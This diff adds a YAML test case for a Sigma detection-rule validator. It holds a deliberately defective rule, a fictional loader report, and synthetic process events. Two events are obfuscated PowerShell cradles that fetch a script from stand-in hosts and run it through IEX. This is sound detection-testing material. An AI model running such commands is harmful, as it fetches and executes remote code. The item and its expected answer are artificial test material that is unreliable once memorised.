@@ -1,0 +1,106 @@
+id: D6-03
+role: defective
+defect_class: D6
+evasive: true
+why: The CommandLine key uses the base64offset modifier ahead of the supported contains modifier (CommandLine|base64offset|contains),
+  and base64offset is not in the accepted modifier set. A check that inspects only the final modifier
+  would see 'contains' and miss it. The remainder of the rule is valid and evidence-backed.
+expected_gate: G3
+report_text: Analysis of the FILEWREN first-stage loader. The loader is started by powershell.exe from
+  a malicious shortcut file. To evade simple string signatures, the script never writes the method name
+  DownloadString in plain text. Instead the powershell.exe command line carries the method name as a base64-encoded
+  fragment, which is decoded at runtime with the Convert class and then used to call the method on a WebClient
+  object. In every sample reviewed, the fragment RG93bmxvYWRTdHJpbmc= appeared directly in the command
+  line. Analysts note that this differs from the more common EncodedCommand switch, because only the method
+  name is encoded and the rest of the command stays readable. The decoded method retrieves a second-stage
+  script from an attacker-controlled web server. Detection should therefore look for the base64 form of
+  DownloadString inside powershell.exe command lines rather than the plain word.
+evidence:
+- the script never writes the method name DownloadString in plain text
+- Detection should therefore look for the base64 form of DownloadString inside powershell.exe command
+  lines rather than the plain word
+logsource: windows_process_creation
+techniques:
+- T1059.001
+- T1027
+sigma_yaml: |
+  title: PowerShell Command Line with Base64-Encoded DownloadString Method Name
+  id: 5e8a2c64-91f7-4d03-8b3e-c6a41d7f20b9
+  status: experimental
+  description: Detects powershell.exe command lines that carry the DownloadString method name in base64 form instead of plain text.
+  references:
+    - urn:atidep:case
+  author: case-author
+  date: 2026/10/02
+  tags:
+    - attack.execution
+    - attack.t1059.001
+    - attack.stealth
+    - attack.t1027
+  logsource:
+    category: process_creation
+    product: windows
+  detection:
+    selection:
+      Image|endswith: '\powershell.exe'
+      CommandLine|base64offset|contains: 'DownloadString'
+    condition: selection
+  falsepositives:
+    - Administrative scripts that deliberately obfuscate method names before packaging
+  level: high
+assumptions: []
+events:
+  positive:
+  - kind: process_create
+    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    cmd: powershell.exe -nop -w hidden -c "$m=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RG93bmxvYWRTdHJpbmc='));
+      $w=New-Object Net.WebClient; IEX $w.$m('http://stage.filewren.test/a.ps1')"
+    parent: C:\Windows\explorer.exe
+    parent_cmd: C:\Windows\Explorer.EXE
+    user: LAB\frank
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    cmd: powershell.exe -ep bypass -c "$n=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RG93bmxvYWRTdHJpbmc='));
+      (New-Object Net.WebClient).$n('http://cdn.filewren.invalid/s2.ps1') | IEX"
+    parent: C:\Windows\explorer.exe
+    parent_cmd: C:\Windows\Explorer.EXE
+    user: LAB\gina
+    dest_ip: null
+    dest_port: null
+    name: null
+  negative:
+  - kind: process_create
+    image: C:\Windows\System32\PING.EXE
+    cmd: ping 192.0.2.1
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\notepad.exe
+    cmd: notepad.exe C:\Users\alice\todo.txt
+    parent: C:\Windows\explorer.exe
+    parent_cmd: C:\Windows\Explorer.EXE
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  lookalike:
+  - kind: process_create
+    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    cmd: powershell.exe -NoProfile -Command "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SGVsbG8gV29ybGQ='))"
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\itadmin
+    dest_ip: null
+    dest_port: null
+    name: null
+tamper_sigma_yaml: ''
+review: {}
+excluded: false
+exclusion_reason: ''
